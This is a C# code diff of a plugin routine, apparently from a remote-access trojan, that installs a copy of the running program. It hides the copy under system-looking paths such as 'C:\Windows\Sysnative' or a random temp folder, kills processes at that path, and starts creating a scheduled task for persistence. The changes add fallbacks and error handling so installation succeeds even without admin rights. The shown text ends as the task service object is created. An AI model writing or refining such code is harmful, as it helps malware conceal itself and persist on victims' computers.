@@ -26,28 +26,26 @@ namespace Plugin.Handler
             try
             {
                 string name = Process.GetCurrentProcess().ProcessName + ".exe";
-                string filepath;
+                string filepath = Path.Combine(Path.GetTempPath()+"\\" + Guid.NewGuid().ToString("N") + "\\", name);
 
                 if (Methods.IsAdmin()&& Environment.Is64BitOperatingSystem) 
                 {
                     try
                     {
-                        filepath = Path.Combine(@"C:\Windows\Sysnative", name);
-                        if (Directory.Exists(@"C:\Windows\Sysnative"))
-                            Directory.Delete(@"C:\Windows\Sysnative");
+                        filepath = Path.Combine(@"C:\Windows\Sysnative", name);                        
                         FileInfo installPath = new FileInfo(filepath);
                         if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
                         {
                             foreach (Process P in Process.GetProcesses())
                             {
-                                try
+                                if (P.MainModule.FileName == installPath.FullName)
                                 {
-                                    if (P.MainModule.FileName == installPath.FullName)
-                                        P.Kill();
+                                    P.Kill();                                    
                                 }
-                                catch { }
                             }
                         }
+                        if (Directory.Exists(@"C:\Windows\Sysnative"))
+                            Directory.Delete(@"C:\Windows\Sysnative");
                         if (!Directory.Exists(@"C:\Windows\Sysnativetemp"))
                             Directory.CreateDirectory(@"C:\Windows\Sysnativetemp");
                         File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(@"C:\Windows\Sysnativetemp", name), true);
@@ -56,22 +54,28 @@ namespace Plugin.Handler
                     }
                     catch
                     {
-                        filepath = Path.Combine(Path.GetTempPath(), name);
-                        FileInfo installPath = new FileInfo(filepath);
-                        if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
-                        {
-
-                            foreach (Process P in Process.GetProcesses())
+                        try {
+                            filepath = Path.Combine(Path.GetTempPath(), name);
+                            FileInfo installPath = new FileInfo(filepath);
+                            if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
                             {
-                                try
+
+                                foreach (Process P in Process.GetProcesses())
                                 {
-                                    if (P.MainModule.FileName == installPath.FullName)
-                                        P.Kill();
+                                    try
+                                    {
+                                        if (P.MainModule.FileName == installPath.FullName)
+                                            P.Kill();
+                                    }
+                                    catch { }
                                 }
-                                catch { }
                             }
-                        }
-                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                            File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                        } 
+                        catch 
+                        {
+                            filepath = Process.GetCurrentProcess().MainModule.FileName;
+                        }                        
                     }
                     
                     TaskService ts = new TaskService();
